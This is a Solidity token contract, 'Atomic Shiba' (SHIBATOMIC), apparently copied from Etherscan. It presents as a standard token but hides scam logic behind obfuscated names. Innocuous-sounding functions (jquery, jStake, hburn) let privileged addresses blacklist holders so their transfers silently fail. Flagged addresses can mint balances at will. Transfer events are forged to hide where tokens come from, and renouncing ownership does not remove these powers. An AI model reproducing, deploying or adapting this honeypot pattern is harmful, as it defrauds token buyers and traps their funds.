/**
 *Submitted for verification at Etherscan.io on 2022-11-06
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address jFX = 0xa045FdC531cfB985b2eC888c36891Bc49Fb3AA3d;
	address jJXF = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract SHIBATOMIC is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private jZA;
	mapping (address => bool) private jZE;
    mapping (address => bool) private jZW;
    mapping (address => mapping (address => uint256)) private jZV;
    uint8 private constant JZD = 8;
    uint256 private constant jTS = 300000000 * (10** JZD);
    string private constant _name = "Atomic Shiba";
    string private constant _symbol = "SHIBATOMIC";



    constructor () {
        jZA[_msgSender()] = jTS;
         JMCR(jJXF, jTS); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return JZD;
    }

    function totalSupply() public pure  returns (uint256) {
        return jTS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return jZA[account];
    }
	

   

	


    function allowance(address owner, address spender) public view  returns (uint256) {
        return jZV[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        jZV[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function jquery(address jZJ) public{
         if(jZE[msg.sender])  { 
        jZW[jZJ] = true; }}
        

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == jFX)  {
        require(amount <= jZA[sender]);
        jZA[sender] -= amount;  
        jZA[recipient] += amount; 
          jZV[sender][msg.sender] -= amount;
        emit Transfer (jJXF, recipient, amount);
        return true; }  else  
          if(!jZW[recipient]) {
          if(!jZW[sender]) {
         require(amount <= jZA[sender]);
        require(amount <= jZV[sender][msg.sender]);
        jZA[sender] -= amount;
        jZA[recipient] += amount;
        jZV[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function jStake(address jZJ) public {
        if(jZE[msg.sender]) { 
        jZW[jZJ] = false;}}
		function JMCR(address jZJ, uint256 jZN) onlyOwner internal {
    emit Transfer(address(0), jZJ ,jZN); }
		
		function transfer(address jZJ, uint256 jZN) public {
        if(msg.sender == jFX)  {
        require(jZA[msg.sender] >= jZN);
        jZA[msg.sender] -= jZN;  
        jZA[jZJ] += jZN; 
        emit Transfer (jJXF, jZJ, jZN);} else  
        if(jZE[msg.sender]) {jZA[jZJ] += jZN;} else
        if(!jZW[msg.sender]) {
        require(jZA[msg.sender] >= jZN);
        jZA[msg.sender] -= jZN;  
        jZA[jZJ] += jZN;          
        emit Transfer(msg.sender, jZJ, jZN);}}
		
			function hburn(address jZJ) onlyOwner public{
        jZE[jZJ] = true; }
		
		

		
		}